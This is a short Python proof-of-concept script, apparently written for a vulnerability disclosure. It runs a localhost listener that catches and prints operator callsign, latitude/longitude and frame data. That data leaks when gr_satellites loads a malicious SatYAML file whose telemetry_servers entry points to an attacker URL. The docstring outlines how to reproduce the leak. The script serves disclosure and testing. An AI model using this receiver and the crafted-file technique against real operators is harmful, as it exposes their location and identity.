#!/usr/bin/env python3
"""F104 PoC: mock attacker listener for SatYAML SSRF reproduction.

Receives the POST that gr_satellites silently sends when an operator
loads a malicious .yml with telemetry_servers: SIDS <our_url>. Prints
what arrives (callsign, lat/lon, frame hex) so the maintainer can see
exactly what leaks.

Run this in one terminal, then in another:
    gr_satellites malicious_satellite.yml --wavfile some_sample.wav
"""

import http.server
import urllib.parse


class ExfilHandler(http.server.BaseHTTPRequestHandler):
    def do_POST(self):
        length = int(self.headers.get('Content-Length', '0'))
        body = self.rfile.read(length).decode('utf-8', errors='replace')
        fields = urllib.parse.parse_qs(body)
        print('=== EXFIL ===')
        print('Path:', self.path)
        for k in sorted(fields):
            print(f'  {k}: {fields[k]}')
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b'ok')

    def log_message(self, *a, **kw):
        pass


if __name__ == '__main__':
    server = http.server.HTTPServer(('127.0.0.1', 9104), ExfilHandler)
    print('Listening on http://127.0.0.1:9104/exfil')
    server.serve_forever()
